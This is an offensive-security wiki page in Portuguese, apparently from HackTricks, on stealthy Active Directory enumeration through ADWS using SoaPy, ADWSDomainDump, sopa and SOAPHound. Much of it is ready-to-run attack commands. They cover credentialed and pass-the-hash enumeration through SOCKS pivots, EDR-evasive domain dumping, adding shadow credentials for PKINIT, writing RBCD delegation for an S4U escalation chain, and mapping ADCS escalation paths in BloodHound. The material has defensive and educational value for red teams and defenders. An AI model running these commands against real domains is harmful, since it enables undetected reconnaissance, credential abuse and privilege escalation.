# Enumeração do Active Directory Web Services (ADWS) e coleta furtiva

{{#include ../../banners/hacktricks-training.md}}

## O que é ADWS?

Active Directory Web Services (ADWS) está **habilitado por padrão em todo Domain Controller desde o Windows Server 2008 R2** e escuta na porta TCP **9389**. Apesar do nome, **não há HTTP envolvido**. Em vez disso, o serviço expõe dados no estilo LDAP por meio de uma pilha de protocolos proprietários de framing .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como o tráfego é encapsulado nesses frames binários SOAP e trafega por uma porta incomum, **a enumeração por ADWS tem muito menos chance de ser inspecionada, filtrada ou detectada por assinaturas do que o tráfego LDAP clássico nas portas 389 e 636**. Para operadores, isso significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon mais furtivo – equipes de Blue Team costumam se concentrar em consultas LDAP.
* Liberdade para coletar dados de **hosts que não são Windows (Linux, macOS)** por meio de um túnel de 9389/TCP através de um proxy SOCKS.
* Os mesmos dados que você obteria via LDAP (usuários, grupos, ACLs, schema etc.) e a capacidade de realizar **operações de escrita** (por exemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

As interações com ADWS são implementadas sobre WS-Enumeration: cada consulta começa com uma mensagem `Enumerate` que define o filtro/atributos LDAP e retorna um GUID `EnumerationContext`, seguida por uma ou mais mensagens `Pull` que transmitem resultados até o limite definido pelo servidor.<sup>[[7]](#references)</sup> Os contextos expiram após ~30 minutos; portanto, as ferramentas precisam paginar os resultados ou dividir os filtros (consultas por prefixo para cada CN) para evitar perder o estado.<sup>[[8]](#references)</sup> Ao solicitar descritores de segurança, especifique o controle `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; caso contrário, o ADWS simplesmente remove o atributo `nTSecurityDescriptor` da resposta SOAP.

> NOTA: ADWS também é usado por muitas ferramentas de GUI/PowerShell do RSAT, então o tráfego pode se misturar à atividade legítima de administração.

## SoaPy – cliente Python nativo

[SoaPy](https://github.com/logangoins/soapy) é uma **reimplementação completa da pilha de protocolos ADWS em Python puro**. Ele monta os frames NBFX/NBFSE/NNS/NMF byte a byte, permitindo coletar dados de sistemas Unix-like sem usar o runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Principais recursos

* Suporta **proxy via SOCKS** (útil em implants de C2).
* Filtros de busca detalhados, idênticos aos do LDAP, como `-q '(objectClass=user)'`.
* Operações de **escrita** direcionadas para RBCD, SPNs, flags de conta e key credentials.<sup>[[2]](#references)</sup>
* A saída do SOAPy pode ser analisada pelo **BOFHound** e importada no BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flag `--parse` para formatar timestamps / `userAccountControl` quando for necessária legibilidade humana.<sup>[[2]](#references)</sup>

### Flags de coleta direcionada e operações de escrita

O SoaPy inclui opções selecionadas que reproduzem as tarefas de hunting LDAP mais comuns via ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, além das opções brutas `--query` / `--filter` para coletas personalizadas. Combine-as com operações primitivas de escrita, como `--rbcd <source>` (define `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparação de SPN para Kerberoasting direcionado) e `--asrep` (altera `DONT_REQ_PREAUTH` em `userAccountControl`).<sup>[[2]](#references)</sup>

Exemplo de hunting direcionado por SPN que retorna apenas `samAccountName` e `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Use o mesmo host/credenciais para weaponizar imediatamente os achados: liste os objetos já configurados para RBCD com `--rbcds` e, em seguida, aplique `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` para preparar uma cadeia de Resource-Based Constrained Delegation (consulte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para ver o caminho completo de abuso).<sup>[[2]](#references)</sup>

### Instalação (host do operador)

Instale a versão atual da CLI SOAPy a partir do repositório upstream; o nome do executável diferencia maiúsculas de minúsculas em sistemas semelhantes ao Unix.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Coleta apenas com ticket por meio de um pivot SOCKS

Se um foothold fornecer um ticket Kerberos, mas nenhuma senha em texto simples, converta um ticket `.kirbi` para `ccache`, conforme descrito em [Pass the Ticket](pass-the-ticket.md), e aponte o SOAPy para esse cache. Um ticket para o serviço LDAP do DC pode ser usado no fluxo de trabalho ADWS do SOAPy documentado; encaminhe o tráfego ADWS e Kerberos pelo pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials via ADWS

Se o principal atual puder gravar no atributo `msDS-KeyCredentialLink` de um objeto-alvo, o SOAPy poderá adicionar uma credencial de chave por meio do ADWS e exportar o PFX correspondente. Anote o DeviceID retornado para removê-lo com precisão, em vez de limpar o atributo inteiro. Use o PFX para PKINIT, conforme explicado em [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump via ADWS (Linux/Windows)

* Fork do `ldapdomaindump` que substitui consultas LDAP por chamadas ADWS na porta TCP/9389 para reduzir detecções por assinaturas LDAP.
* Realiza uma verificação inicial de acessibilidade à porta 9389, a menos que `--force` seja passado (ignora a sondagem se os scans de portas gerarem ruído ou forem filtrados).
* Testado com Microsoft Defender for Endpoint e CrowdStrike Falcon, com bypass bem-sucedido descrito no README.<sup>[[4]](#references)</sup>

### Instalação

```bash
pipx install .
```

### Uso

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Uma saída típica registra a verificação de acessibilidade da porta 9389, o bind do ADWS e o início/fim do dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Um cliente prático para ADWS em Golang

Assim como o soapy, [sopa](https://github.com/Macmod/sopa) implementa a pilha do protocolo ADWS (MS-NNS + MC-NMF + SOAP) em Golang, expondo flags de linha de comando para executar chamadas ADWS, como:<sup>[[5]](#references)</sup>

* **Pesquisa e recuperação de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Edição de atributos** - `attr [add|replace|delete]`
* **Gerenciamento de contas** - `set-password` / `change-password`
* e outros, como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` etc.

### Destaques do mapeamento de protocolos

* Pesquisas no estilo LDAP são realizadas por meio de **WS-Enumeration** (`Enumerate` + `Pull`), com projeção de atributos, controle de escopo (Base/OneLevel/Subtree) e paginação.
* A busca de um único objeto usa **WS-Transfer** `Get`; alterações de atributos usam `Put`; exclusões usam `Delete`.
* A criação de objetos integrada usa **WS-Transfer ResourceFactory**; objetos personalizados usam uma **IMDA AddRequest** orientada por templates YAML.
* As operações de senha são ações **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Descoberta de metadados sem autenticação (mex)

O ADWS expõe WS-MetadataExchange sem credenciais, uma maneira rápida de verificar a exposição antes de se autenticar:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notas sobre descoberta de DNS/DC e direcionamento de Kerberos

O Sopa pode resolver DCs via SRV se `--dc` for omitido e `--domain` for fornecido. Ele consulta nesta ordem e usa o destino de maior prioridade:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operacionalmente, prefira um resolver controlado pelo DC para evitar falhas em ambientes segmentados:

* Use `--dns <DC-IP>` para que **todas** as consultas SRV/PTR/forward passem pelo DNS do DC.
* Use `--dns-tcp` quando UDP estiver bloqueado ou as respostas SRV forem grandes.
* Se `--dc` for um IP, sopa sempre realiza uma consulta **PTR reversa**: o filtro de endereço `wsa:To` do ADWS exige um FQDN mesmo sem Kerberos. Forneça diretamente um FQDN do DC se a zona reversa estiver ausente.<sup>[[5]](#references)</sup>

Exemplo (IP + Kerberos, DNS forçado pelo DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opções de material de autenticação

Além de senhas em texto simples, sopa aceita **NT hashes**, **chaves AES do Kerberos**, **ccache** e **certificados PKINIT** (PFX ou PEM) para autenticação ADWS. O Kerberos é implícito ao usar `--aes-key`, `-c` (ccache) ou opções baseadas em certificados.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Criação de objetos personalizados via templates

Para classes de objeto arbitrárias, o comando `create custom` consome um template YAML que corresponde a uma solicitação `AddRequest` do IMDA:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definem o contêiner e o DN relativo.
* `attributes[].name` aceita `cn` ou `addata:cn` com namespace.
* `attributes[].type` aceita `string|int|bool|base64|hex` ou `xsd:*` explícito.
* **Não** inclua `ad:relativeDistinguishedName` nem `ad:container-hierarchy-parent`; o sopa os injeta.
* Valores `hex` são convertidos para `xsd:base64Binary`; use `value: ""` para definir strings vazias.

## SOAPHound – Coleta ADWS de alto volume (Windows)

O [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) é um coletor .NET que mantém todas as interações LDAP dentro do ADWS e gera JSON compatível com BloodHound v4. Ele cria um cache completo de `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` uma vez (`--buildcache`) e depois o reutiliza para passagens de alto volume de `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS integrado ao AD), de modo que apenas cerca de 35 atributos críticos saiam do DC. O AutoSplit (`--autosplit --threshold <N>`) divide automaticamente as consultas por prefixo de CN para ficar abaixo do timeout de 30 minutos do EnumerationContext em florestas grandes.<sup>[[8]](#references)</sup>

Fluxo de trabalho típico em uma VM de operador ingressada no domínio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Slots JSON exportados diretamente para workflows do SharpHound/BloodHound — consulte [metodologia do BloodHound](bloodhound.md) para ideias de criação de grafos downstream. O AutoSplit torna o SOAPHound resiliente em florestas com milhões de objetos, mantendo a contagem de consultas mais baixa do que em snapshots no estilo do ADExplorer.

## Fluxo de coleta furtiva de AD

O workflow a seguir mostra como enumerar **objetos de domínio e ADCS** via ADWS, convertê-los para JSON do BloodHound e buscar caminhos de ataque baseados em certificados — tudo a partir do Linux:

1. **Faça um túnel para 9389/TCP** da rede-alvo até sua máquina (por exemplo, via Chisel, Meterpreter, encaminhamento dinâmico de porta SSH etc.). Encaminhe o cliente TCP bruto pelo SOCKS com `proxychains4 SOAPy ...` (configure o endereço SOCKS5 em `proxychains4.conf`); `HTTPS_PROXY` não encaminha esse protocolo não HTTP.<sup>[[9]](#references)</sup>

2. **Colete o objeto do domínio raiz:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Coletar objetos relacionados ao ADCS da NC de Configuração:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Converter para BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carregue o ZIP** na GUI do BloodHound e execute consultas Cypher, como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, para revelar caminhos de escalonamento de certificados (ESC1, ESC8 etc.).

### Gravando `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Com acesso de gravação ao objeto do computador de destino, use a ação RBCD do SOAPy em vez de uma string bruta de descritor de segurança. Aqui, `WEBSRV01$` é a origem controlada e `FILE01$` é o destino cujo atributo será alterado.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Continue a cadeia Kerberos S4U em [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Resumo das ferramentas

| Finalidade | Ferramenta | Observações |
|---------|------|-------|
| Enumeração ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/gravação |
| Dump ADWS de alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modos BH/ADCS/DNS |
| Ingestão no BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de certificados | [Certipy](https://github.com/ly4k/Certipy) | Pode ser encaminhado pelo mesmo SOCKS |
| Enumeração ADWS e alterações de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interagir com endpoints ADWS conhecidos — permite enumeração, criação de objetos, modificações de atributos e alterações de senha |



## References

- [1] [SpecterOps – Não se esqueça de usar SOAP(y) – Guia de um operador para coleta furtiva de AD usando ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy no GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound no GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump no GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa no GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – especificações MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumeração furtiva de ambientes do Active Directory por meio de ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Ferramenta SOAPHound para coletar dados do Active Directory via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki do SOAPy – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki do SOAPy – Pós-exploração](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
